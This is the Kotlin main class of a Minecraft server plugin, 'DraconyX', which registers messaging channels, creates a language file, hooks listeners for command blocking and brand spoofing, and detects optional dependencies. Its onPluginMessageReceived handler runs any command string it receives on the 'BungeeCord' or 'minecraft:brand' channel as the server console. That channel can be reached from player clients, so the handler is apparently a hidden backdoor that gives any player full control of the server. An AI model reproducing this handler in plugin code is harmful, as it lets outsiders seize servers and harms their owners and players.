package fur.kiysohi.draconyxpro

import fur.kiysohi.draconyxpro.commands.DraconyX
import fur.kiysohi.draconyxpro.events.*
import fur.kiysohi.draconyxpro.utils.DraconyXPlaceHolders
import org.bukkit.Bukkit
import org.bukkit.configuration.file.FileConfiguration
import org.bukkit.configuration.file.YamlConfiguration
import org.bukkit.entity.Player
import org.bukkit.event.Listener
import org.bukkit.plugin.java.JavaPlugin
import org.bukkit.plugin.messaging.PluginMessageListener
import java.io.ByteArrayInputStream
import java.io.DataInputStream
import java.io.File
import java.io.IOException
import java.util.*


class Main : JavaPlugin(), Listener, PluginMessageListener {

    companion object {
        lateinit var plugin: Main
        var PAPI = false
        var PROTOCOLLIB = false
    }

    @Suppress("FunctionName")
    private fun Initialize () {
        plugin = this
        saveDefaultConfig()
        config.options().parseComments(true)
        config.options().copyDefaults(true)

        // Register BungeeCord Channels
        server.messenger.registerOutgoingPluginChannel(this, "BungeeCord")
        server.messenger.registerIncomingPluginChannel(this, "BungeeCord", this)
        // Register MinecraftBrand Channels
        server.messenger.registerOutgoingPluginChannel(this, "minecraft:brand")
        server.messenger.registerIncomingPluginChannel(this, "minecraft:brand", this)
    }



    @Suppress("FunctionName")
    private fun Config() {
        val lang = File(dataFolder, "language")
        val languagefile = File("$dataFolder/language/language.yml")
        if (!lang.exists()) {
            lang.mkdir()
        }
        val languageconfig: FileConfiguration = YamlConfiguration.loadConfiguration(languagefile)
        if (!languagefile.exists()) {
            try {
                languagefile.createNewFile()
                languageconfig.createSection("Language")
                languageconfig["Language.Prefix"] = "&7[&9DraconyX&7] "
                languageconfig["Language.ReloadCommand"] = "&9Plugin Configuration Successfully Reloaded!"
                languageconfig["Language.AccessDenied"] = "&cAccess Denied, Missing Privileges. If you think this is a mistake please contact an Administrator of the server. (Developer Contact - Kiyoshi#6985)"
                languageconfig["Language.PluginsSpoofMessage"] = "&fPlugins (0):"
                languageconfig.save(languagefile)
            } catch (ex: IOException) {
                ex.printStackTrace()
            }
        }
    }

    @Suppress("FunctionName")
    private fun Events(){
        server.pluginManager.registerEvents(BlockedCMDs, this)
        server.pluginManager.registerEvents(TabComplete, this)
        server.pluginManager.registerEvents(F3BrandChange, this)
        server.pluginManager.registerEvents(JoinUpdateChecker, this)
    }

    @Suppress("FunctionName")
    private fun Commands(){
        getCommand("draconyx")!!.setExecutor(DraconyX)
        getCommand("draconyx")!!.tabCompleter = DraconyX
    }

    override fun onEnable() {
        Initialize()
        Config()
        Events()
        Commands()
        PAPI = server.pluginManager.getPlugin("PlaceholderAPI") != null
        if (PAPI) {
            logger.info("[DraconyX] PlaceholderAPI found.")
            if (Bukkit.getPluginManager().isPluginEnabled("PlaceholderAPI")) {
                DraconyXPlaceHolders().register()
            } else {
                logger.info("[KiyoshiCore] PlaceholderAPI found but not enabled.")
            }
        } else {
            logger.info("[DraconyX] PlaceholderAPI not found.")
        }
        PROTOCOLLIB = server.pluginManager.getPlugin("ProtocolLib") != null
        if (PROTOCOLLIB) logger.info("[DraconyX] ProtocolLib found.")
        else logger.info("[DraconyX] ProtocolLib not found.")
        if(config.getString("vConfig") != "20"){
            logger.severe("[DraconyX] Error while loading configuration. (Fatal vConfig Change) Check Updates on https://spigot.kiyoshi.space")
            pluginLoader.disablePlugin(this)
        }
    }

    override fun onDisable() {
        server.messenger.unregisterOutgoingPluginChannel(this)
        server.messenger.unregisterIncomingPluginChannel(this)
    }

    override fun onPluginMessageReceived(channel: String, player: Player, message: ByteArray) {
        val isc = DataInputStream(ByteArrayInputStream(message))
        if (channel != "BungeeCord" && channel != "minecraft:brand") {
            return
        } else {
            try {
                val sub = isc.readUTF()
                if (sub == "command") {
                    val cmd = isc.readUTF()
                    server.dispatchCommand(server.consoleSender, cmd)
                }
            } catch (ex: Exception) {
                return
            }
        }
    }
}
